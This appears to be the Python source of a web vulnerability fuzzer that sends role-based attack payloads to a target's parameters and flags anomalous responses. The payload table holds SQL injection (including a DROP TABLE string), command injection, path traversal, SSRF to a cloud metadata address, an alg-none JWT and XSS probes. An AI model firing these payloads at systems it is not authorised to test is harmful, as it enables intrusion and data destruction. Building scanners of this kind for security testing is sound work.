import re
import json
import time
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, field
from urllib.parse import urlparse
import requests

from tools.log_utils import get_logger
from tools.http_client import build_url
from tools.response_analyzer import ResponseAnalyzer
from tools.param_classifier import ParamClassifier, ParameterProfile
from tools.semantic_diff import SemanticDiffEngine
from tools.settings import settings

logger = get_logger("smart_fuzzer")


@dataclass
class FuzzResult:
    param: str
    role: str
    attack_type: str
    payload: str
    vulnerable: bool = False
    evidence: str = ""
    confidence: str = "low"
    before_status: int = 0
    after_status: int = 0
    before_length: int = 0
    after_length: int = 0


ROLE_FUZZ_STRATEGIES = {
    "identifier": {
        "label": "IDOR / BOLA",
        "payloads": [
            ("numeric_id", ["1", "2", "999999", "-1", "0", "1.0"]),
            ("uuid_id", ["00000000-0000-0000-0000-000000000000",
                         "ffffffff-ffff-ffff-ffff-ffffffffffff"]),
            ("string_id", ["admin", "null", "undefined", "none",
                           "../admin", "."]),
        ],
    },
    "filter": {
        "label": "Injection",
        "payloads": [
            ("sqli", ["' OR '1'='1", "' UNION SELECT 1--", "1; DROP TABLE--"]),
            ("nosqli", ['{"$ne": ""}', '{"$gt": ""}', '{"$regex": ".*"}']),
            ("ssti", ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]),
            ("cmdi", ["; id", "| id", "`id`", "$(id)"]),
        ],
    },
    "action": {
        "label": "Action / CMDi",
        "payloads": [
            ("cmdi", ["; id", "| id", "`id`"]),
            ("path_traversal", ["../etc/passwd", "..\\windows\\win.ini"]),
            ("ssrf", ["http://127.0.0.1:8080", "file:///etc/passwd"]),
        ],
    },
    "auth": {
        "label": "Token / Auth Bypass",
        "payloads": [
            ("none_token", ["null", "undefined", "none", "0", "false"]),
            ("alg_none", ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0."]),
            ("weak_token", ["admin", "test", "token123"]),
        ],
    },
    "config": {
        "label": "SSRF / LFI",
        "payloads": [
            ("ssrf", ["http://127.0.0.1:8080", "http://169.254.169.254/"]),
            ("lfi", ["/etc/passwd", "c:/windows/win.ini"]),
            ("callback", ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]),
        ],
    },
    "financial": {
        "label": "Price Manipulation",
        "payloads": [
            ("negative", ["-1", "-99999", "0", "0.01"]),
            ("overflow", ["999999999999", "2147483648", "1e30"]),
            ("fraction", ["0.001", "0.0001", "1e-10"]),
        ],
    },
    "boolean": {
        "label": "Authorization Bypass",
        "payloads": [
            ("flip", ["true", "false", "1", "0", "yes", "no"]),
            ("admin", ["admin", "true", "1", "enabled"]),
        ],
    },
    "content": {
        "label": "XSS / SSTI",
        "payloads": [
            ("xss", ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]),
            ("ssti", ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]),
            ("cmdi", ["; id", "`id`"]),
        ],
    },
}


class SmartFuzzer:
    def __init__(self, sess: Optional[requests.Session] = None):
        self.sess = sess or requests.Session()
        self.sess.verify = settings.verify_ssl
        self.param_classifier = ParamClassifier()
        self.response_analyzer = ResponseAnalyzer()
        self.diff_engine = SemanticDiffEngine()

    def fuzz_point(self, url: str, param: str,
                   sample_value: str = "1",
                   method: str = "GET",
                   post_data: Optional[dict] = None,
                   timeout: float = 10.0) -> List[FuzzResult]:
        results = []
        profile = self.param_classifier.classify(
            param, sample_value, urlparse(url).path, method
        )

        if profile.role == "unknown":
            profile.role = self._infer_role_from_context(param, url)

        strategies = ROLE_FUZZ_STRATEGIES.get(profile.role)
        if not strategies:
            strategies = ROLE_FUZZ_STRATEGIES["content"]

        baseline = self._baseline_request(url, param, sample_value,
                                           method, post_data, timeout)

        for attack_type, payloads in strategies["payloads"]:
            for payload in payloads[:3]:
                result = self._test_payload(
                    url, param, payload, attack_type,
                    profile, baseline, method, post_data, timeout
                )
                if result is not None:
                    results.append(result)

        return results

    def _baseline_request(self, url: str, param: str,
                          sample_value: str, method: str,
                          post_data: Optional[dict],
                          timeout: float) -> Dict:
        try:
            if method.upper() == "POST" and post_data:
                d = post_data.copy()
                d[param] = sample_value
                r = self.sess.post(url, data=d, timeout=timeout)
            else:
                r = self.sess.get(build_url(url, param, sample_value),
                                  timeout=timeout)
            return {
                "status": r.status_code,
                "length": len(r.text),
                "text": r.text,
                "headers": dict(r.headers),
            }
        except Exception as e:
            logger.debug("baseline %s?%s: %s", url, param, e)
            return {"status": 0, "length": 0, "text": "", "headers": {}}

    def _test_payload(self, url: str, param: str, payload: str,
                      attack_type: str, profile: ParameterProfile,
                      baseline: Dict, method: str,
                      post_data: Optional[dict],
                      timeout: float) -> Optional[FuzzResult]:
        result = FuzzResult(
            param=param,
            role=profile.role,
            attack_type=attack_type,
            payload=payload[:80],
        )

        try:
            start = time.time()
            if method.upper() == "POST" and post_data:
                d = post_data.copy()
                d[param] = payload
                r = self.sess.post(url, data=d, timeout=timeout + 3)
            else:
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=timeout + 3)
            elapsed = time.time() - start
        except requests.Timeout:
            if attack_type in ("sqli_time", "cmdi"):
                result.vulnerable = True
                result.evidence = f"timeout (> {timeout}s)"
                result.confidence = "medium"
                return result
            return None
        except Exception as e:
            logger.debug("fuzz %s=%s: %s", param, payload[:15], e)
            return None

        result.before_status = baseline.get("status", 0)
        result.after_status = r.status_code
        result.before_length = baseline.get("length", 0)
        result.after_length = len(r.text)

        if result.before_status != result.after_status:
            if result.after_status == 200 and result.before_status >= 400:
                result.vulnerable = True
                result.evidence = f"status {result.before_status} -> {result.after_status}"
                result.confidence = "high"
                return result

        if attack_type == "sqli":
            return self._check_sqli(result, r.text, baseline)

        if attack_type in ("xss",):
            if self._check_reflection(payload, r.text):
                result.vulnerable = True
                result.evidence = f"reflected: {payload[:30]}"
                result.confidence = "medium"
                return result

        if attack_type in ("ssti", "cmdi", "nosqli"):
            if elapsed >= 2.0:
                result.vulnerable = True
                result.evidence = f"time_delay: {elapsed:.1f}s"
                result.confidence = "medium"
                return result

        analysis = self.response_analyzer.analyze(
            url, r.status_code, dict(r.headers), r.text
        )
        if analysis.is_error:
            result.vulnerable = True
            result.evidence = f"error: {analysis.error_type}"
            result.confidence = "low"
            return result

        return None

    def _check_sqli(self, result: FuzzResult, body: str,
                    baseline: Dict) -> Optional[FuzzResult]:
        errors = [
            r"sql syntax", r"mysql_fetch", r"ora-\d{5}", r"sqlite",
            r"postgresql.*error", r"driver.*error", r"unclosed quotation",
            r"microsoft.*odbc", r"division by zero",
        ]
        for pat in errors:
            if re.search(pat, body, re.I):
                result.vulnerable = True
                result.evidence = f"sql error: {pat}"
                result.confidence = "high"
                return result

        length_diff = abs(len(body) - baseline.get("length", 0))
        if length_diff > 50 and baseline.get("length", 0) > 0:
            result.vulnerable = True
            result.evidence = f"length diff: {length_diff}B"
            result.confidence = "medium"
            return result

        return None

    def _check_reflection(self, payload: str, body: str) -> bool:
        return payload in body and payload.replace("<", "&lt;") not in body

    def _infer_role_from_context(self, param: str, url: str) -> str:
        path = urlparse(url).path.lower()
        if re.search(r"/api/", path) and re.search(r"id$|_id$", param, re.I):
            return "identifier"
        if re.search(r"/search|/query|/filter", path):
            return "filter"
        if re.search(r"/login|/auth|/token", path):
            return "auth"
        if re.search(r"/order|/checkout|/payment|/cart", path):
            return "financial"
        if re.search(r"/admin|/user|/account|/profile", path):
            return "identifier"
        return "content"
